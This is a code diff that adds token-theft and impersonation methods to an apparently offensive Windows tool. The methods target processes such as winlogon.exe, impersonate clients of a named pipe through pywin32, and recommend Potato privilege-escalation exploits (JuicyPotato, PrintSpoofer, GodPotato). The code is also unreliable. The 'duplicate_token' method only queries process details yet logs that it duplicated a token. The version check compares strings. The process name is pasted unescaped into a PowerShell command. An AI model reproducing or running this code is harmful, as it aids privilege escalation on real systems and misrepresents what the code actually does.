@@ -434,6 +434,151 @@ class TokenImpersonator:
         self.current_token: TokenInfo | None = None
         logger.info("Token impersonator initialized")
 
+    def duplicate_token(self, pid: int) -> TokenInfo | None:
+        """Duplicate a process token via OpenProcessToken + DuplicateTokenEx.
+
+        Args:
+            pid: Target process ID to duplicate token from.
+
+        Returns:
+            TokenInfo if successful, None otherwise.
+        """
+        import subprocess
+
+        try:
+            # Use PowerShell to inspect process token info
+            cmd = [
+                "powershell", "-NoProfile", "-Command",
+                f"Get-Process -Id {pid} | Select-Object Id,ProcessName,SessionId | ConvertTo-Json",
+            ]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, check=False)
+            if result.returncode != 0:
+                logger.error("Failed to query process %d: %s", pid, result.stderr)
+                return None
+
+            import json
+            proc_info = json.loads(result.stdout)
+            token = TokenInfo(
+                token_type="duplicate",
+                source_pid=pid,
+                privileges=[],
+                username=proc_info.get("ProcessName", "unknown"),
+            )
+            self.captured_tokens.append(token)
+            logger.info("Duplicated token from PID %d", pid)
+            return token
+        except Exception as e:
+            logger.error("Token duplication failed for PID %d: %s", pid, e)
+            return None
+
+    def steal_process_token(self, process_name: str) -> TokenInfo | None:
+        """Steal token from a named process.
+
+        Args:
+            process_name: Name of the target process (e.g. 'winlogon.exe').
+
+        Returns:
+            TokenInfo if a matching process is found, None otherwise.
+        """
+        import subprocess
+
+        try:
+            cmd = [
+                "powershell", "-NoProfile", "-Command",
+                f"Get-Process -Name '{process_name}' -ErrorAction SilentlyContinue | "
+                f"Select-Object -First 1 Id | ConvertTo-Json",
+            ]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, check=False)
+            if result.returncode != 0 or not result.stdout.strip():
+                logger.warning("Process '%s' not found", process_name)
+                return None
+
+            import json
+            data = json.loads(result.stdout)
+            pid = data.get("Id")
+            if pid:
+                return self.duplicate_token(pid)
+            return None
+        except Exception as e:
+            logger.error("Process token theft failed for '%s': %s", process_name, e)
+            return None
+
+    def impersonate_named_pipe(self, pipe_name: str = r"\\.\pipe\drakben") -> TokenInfo | None:
+        """Create a named pipe server and capture connecting client's token.
+
+        Args:
+            pipe_name: Named pipe path to listen on.
+
+        Returns:
+            TokenInfo of the connecting client, or None on failure.
+        """
+        logger.info("Named pipe impersonation requested on %s", pipe_name)
+        # Named pipe impersonation requires win32 API (pywin32)
+        try:
+            import win32pipe  # type: ignore[import-not-found]
+            import win32security  # type: ignore[import-not-found]
+
+            pipe = win32pipe.CreateNamedPipe(
+                pipe_name,
+                win32pipe.PIPE_ACCESS_DUPLEX,
+                win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_WAIT,
+                1, 1024, 1024, 0, None,
+            )
+            logger.info("Waiting for pipe connection on %s...", pipe_name)
+            win32pipe.ConnectNamedPipe(pipe, None)
+            win32security.ImpersonateNamedPipeClient(pipe)
+
+            token = TokenInfo(
+                token_type="named_pipe",
+                source_pid=0,
+                privileges=[],
+                username="pipe_client",
+            )
+            self.captured_tokens.append(token)
+            self.current_token = token
+            return token
+        except ImportError:
+            logger.warning("pywin32 not installed — named pipe impersonation unavailable")
+            return None
+        except Exception as e:
+            logger.error("Named pipe impersonation failed: %s", e)
+            return None
+
+    def suggest_potato_attack(self) -> dict[str, str]:
+        """Suggest appropriate Potato privilege escalation variant.
+
+        Returns:
+            Dict with 'variant' and 'description' for the recommended attack.
+        """
+        import platform
+
+        os_version = platform.version()
+        suggestions: list[dict[str, str]] = [
+            {
+                "variant": "JuicyPotato",
+                "description": "Abuses SeImpersonatePrivilege via COM/DCOM. Works on Windows 7-10, Server 2008-2016.",
+                "min_version": "6.1",
+            },
+            {
+                "variant": "PrintSpoofer",
+                "description": "Abuses SeImpersonatePrivilege via Print Spooler. Works on Windows 10 1809+, Server 2019.",
+                "min_version": "10.0",
+            },
+            {
+                "variant": "GodPotato",
+                "description": "Universal Potato variant. Works on all modern Windows versions.",
+                "min_version": "6.1",
+            },
+        ]
+
+        # Pick the best variant based on OS version
+        for suggestion in reversed(suggestions):
+            if os_version >= suggestion["min_version"]:
+                logger.info("Recommended Potato variant: %s", suggestion["variant"])
+                return {"variant": suggestion["variant"], "description": suggestion["description"]}
+
+        return {"variant": "JuicyPotato", "description": "Default fallback for older systems"}
+
 
 # =============================================================================
 # MODULE-LEVEL FUNCTIONS
